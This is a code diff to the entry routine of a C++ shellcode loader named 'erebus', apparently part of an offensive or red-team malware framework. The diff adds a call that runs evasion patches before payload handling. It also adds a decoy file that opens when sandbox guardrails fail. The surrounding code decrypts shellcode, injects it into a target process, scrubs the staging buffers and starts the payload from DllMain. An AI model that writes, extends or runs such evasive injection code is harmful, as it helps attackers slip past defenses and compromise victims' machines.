@@ -2,9 +2,15 @@
 #include "../include/shellcode.hpp"
 #include "../include/shellcode_optional.hpp"
 #include "../include/config.hpp"
+#include "../include/evasion/evasion.hpp"
 
 VOID entry(void)
 {
+	// ============================================================
+	// EVASION PATCHES - run before any shellcode processing
+	// ============================================================
+	erebus::evasion::RunEvasionPatches();
+
 	// ============================================================
 	// GUARDRAILS CHECK
 	// ============================================================
@@ -13,8 +19,11 @@ VOID entry(void)
 		erebus::guardrails::CheckResult guardrail_result = erebus::guardrails::RunGuardrails(guardrail_config);
 		
 		if (!guardrail_result.passed) {
-			// Guardrails failed - exit silently or execute decoy behavior
-			// For stealth, simply return without logging
+			// Guardrails failed - open decoy file if configured, then exit
+			const char* decoy = CONFIG_GUARDRAILS_DECOY_FILE;
+			if (decoy && decoy[0] != '\0') {
+				ShellExecuteA(NULL, "open", decoy, NULL, NULL, SW_SHOWNORMAL);
+			}
 			return;
 		}
 	#endif
@@ -128,7 +137,7 @@ VOID entry(void)
 	}
 	#endif
 
-	// Decrypt with explicit key — key material is zeroed immediately after.
+	// Decrypt with explicit key - key material is zeroed immediately after.
 	BYTE key_copy[sizeof(key)];
 	RtlCopyMemory(key_copy, key, sizeof(key));
 	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key_copy, sizeof(key_copy), iv, iv_len);
@@ -151,7 +160,7 @@ VOID entry(void)
 	// Execute injection
 	erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);
 
-	// Scrub the staging buffer — shellcode is now in the target process.
+	// Scrub the staging buffer - shellcode is now in the target process.
 	if (shellcode_ptr)
 	{
 		SecureZeroMemory(shellcode_ptr, shellcode_size);
@@ -226,7 +235,7 @@ static DWORD WINAPI EntryThread(LPVOID)
 	return 0;
 }
 
-// DllMain spawns the payload thread and retains the handle — it does NOT
+// DllMain spawns the payload thread and retains the handle - it does NOT
 // close it.  Spawning here is safe: the thread is only *scheduled* inside
 // DllMain; it begins executing after DllMain returns and the loader lock is
 // released, so entry() can freely call CreateProcess, VirtualAllocEx, etc.
